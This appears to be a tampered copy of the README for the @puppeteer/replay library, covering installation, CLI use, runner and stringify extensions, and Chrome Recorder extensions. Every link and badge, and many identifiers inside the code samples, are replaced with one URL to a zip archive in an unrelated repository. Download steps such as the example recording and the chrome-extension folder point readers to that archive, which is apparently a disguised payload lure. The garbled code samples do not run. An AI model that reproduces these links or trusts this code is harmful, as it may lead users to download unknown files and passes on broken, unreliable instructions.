# @puppeteer/replay

<!-- [START badges] -->

[![Build status](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip%3Arun-checks) [![npm puppeteer package](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)

<!-- [END badges] -->

###### [API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) | [Contributing](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)

> Puppeteer Replay is a library that provides an API to replay and stringify recordings created using [Chrome DevTools Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)

## Installation

```
npm install @puppeteer/replay --save
```

If you want to replay recordings using Puppeteer, install Puppeteer as well:

```
npm install puppeteer --save
```

## Getting started with Puppeteer Replay

You can use Puppeteer Replay to:

1. **Replay recording**. Replay recording with CLI or using [the replay lib API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).
2. **Customize replay**. Customize how a recording is run. For example, capture screenshots after each step or integrate with 3rd party libraries.
3. **Transform recording**. Customize how a recording is stringified. For example, transform the recording into another format.

Also, you can use third-party integrations that build on top of `@puppeteer/replay`, which includes:

Transform JSON user flows to custom scripts:

- [Cypress Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to Cypress test scripts. Watch this [demo](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to see it in action.
- [Nightwatch Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to Nightwatch test scripts.
- [WebdriverIO Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to WebdriverIO test scripts.

Replay JSON user flows:

- [Replay with TestCafe](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use TestCafe to replay user flow JSON files and generate test reports for these recordings.
- [Replay with Sauce Labs](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can replay the JSON files on [Sauce Labs](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) using [saucectl](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).

## 1. Replay recording

Download this [example recording](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) and save it as `https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip`.

Using CLI + npx:

```
npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
```

Using CLI + https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip

In your `https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip` add a new script to invoke the `replay` command:

```json
{
  "scripts": {
    "replay": "replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip"
  }
}
```

You can also give folder name as a parameter to run all the files in a folder.

Using CLI + npx:

```bash
npx @puppeteer/replay all-recordings # runs all recordings in the "all-recordings" folder.
```

Using CLI + https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip

```json
{
  "scripts": {
    "replay": "replay all-recordings"
  }
}
```

Set the `PUPPETEER_HEADLESS` environment variable or `--headless` CLI flag to control whether the browser is started in a headful or headless mode. For example,

```
PUPPETEER_HEADLESS=true npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in headless mode, the default mode.
PUPPETEER_HEADLESS=false npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in headful mode.
PUPPETEER_HEADLESS=chrome npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in the new experimental headless mode.
```

Use the `--extension` CLI flag to provide a [custom replay extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) for running the recording. For [example](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip),

```sh
npx @puppeteer/replay --extension https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
```

Run `npx @puppeteer/replay --help` to see all CLI options.

Using [the replay lib API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip):

```js
import { createRunner, parse } from '@puppeteer/replay';
import fs from 'fs';

// Read recording for a file.
const recordingText = https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip', 'utf8');
// Validate & parse the file.
const recording = parse(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(recordingText));
// Create a runner and execute the script.
const runner = await createRunner(recording);
await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
```

## 2. Customize replay

The library offers a way to customize how a recording is run. You can extend
the `PuppeteerRunnerExtension` class as shown in the example below.

Full example of the `PuppeteerRunnerExtension`: [link](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)

```js
import { createRunner, PuppeteerRunnerExtension } from '@puppeteer/replay';
import puppeteer from 'puppeteer';

const browser = await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip({
  headless: true,
});

const page = await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();

class Extension extends PuppeteerRunnerExtension {
  async beforeAllSteps(flow) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(flow);
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('starting');
  }

  async beforeEachStep(step, flow) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(step, flow);
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('before', step);
  }

  async afterEachStep(step, flow) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(step, flow);
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('after', step);
  }

  async afterAllSteps(flow) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(flow);
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('done');
  }
}

const runner = await createRunner(
  {
    title: 'Test recording',
    steps: [
      {
        type: 'navigate',
        url: 'https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip',
      },
    ],
  },
  new Extension(browser, page, 7000)
);

await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();

await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
```

## 3. Transform recording

You can customize how a recording is stringified and use it to transform the recording format.

### Stringify a recording as a Puppeteer script

```js
import { stringify } from '@puppeteer/replay';

https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(
  await stringify({
    title: 'Test recording',
    steps: [],
  })
);
```

### Customize how a recording is stringified

You can customize how a recording is stringified by extending the `PuppeteerStringifyExtension` class as shown in the example below.

Full example of `PuppeteerStringifyExtension` : [link](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)

```js
import { stringify, PuppeteerStringifyExtension } from '@puppeteer/replay';

class Extension extends PuppeteerStringifyExtension {
  // beforeAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
  async beforeAllSteps(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
    args[0].appendLine('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("starting");');
  }

  // beforeEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
  async beforeEachStep(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
    const [out, step] = args;
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(`https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("about to execute step ${https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip}")`);
  }

  // afterEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
  async afterEachStep(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
    const [out, step] = args;
    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(`https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("finished step ${https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip}")`);
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
  }

  // afterAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
  async afterAllSteps(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
    args[0].appendLine('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("finished");');
    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
  }
}

https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(
  await stringify(
    {
      title: 'Test recording',
      steps: [
        {
          type: 'navigate',
          url: 'https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip',
        },
      ],
    },
    {
      extension: new Extension(),
      indentation: '	', // use tab to indent lines
    }
  )
);
```

## Others

### Test your extensions using the replay lib

The replay lib offers a canonical recording and a test page that allows to
verify that your extension produces all expected side effects on a page.

The test command supports both stringify and runner extensions. The stringify
extension will be tested by running the stringified script using node. Run the
test using the following command.

```
npx -p @puppeteer/replay replay-extension-test --ext path-to-your-extension-js
```

### Create a Chrome extension for Recorder (Available from Chrome 104 onwards)

You can create a Chrome extension for [Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Refer to the [Chrome Extensions documentation](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) for more details on how to extend DevTools.

For example, here are some of the third party extensions:

- [Cypress extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Cypress test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Cypress](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is a front end testing tool built for the modern web.
- [WebPageTest extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export user flows from the Recorder directly as [WebPageTest Custom scripts](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to measure site's performance. See [Converting user flows to WebPageTest custom scripts](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to learn more.
- [Nightwatch extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Nightwatch test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Nightwatch](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is an end-to-end testing solution for web applications and websites.
- [Testing Library extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Testing Library script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Testing Library](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) has simple and complete testing utilities that encourage good testing practices.
- [WebdriverIO extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [WebdriverIO test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [WebdriverIO](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is an end-to-end testing solution for web, mobile and IoT applications and websites.

This feature only available from Chrome 104 onwards. Check your current Chrome version with `chrome://version`. Consider installing [Chrome Canary](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to try out cutting-edge features in Chrome.

This repository contains an [example extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Once installed, the Recorder will have a new export option **Export as a Custom JSON script** in the [export dropdown](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).

To load the example into Chrome DevTools. Follow these steps:

1. Download the [chrome-extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) folder.
2. [Load the folder as unpacked extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) in Chrome.
3. [Open a recording](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) in the Recorder.
4. Click on [export](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Now you can see a new **Export as a Custom JSON script** option in the export menu.

Click and watch the video demo below:

[![Demo video that shows how to extend export options in Recorder panel by adding a Chrome extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
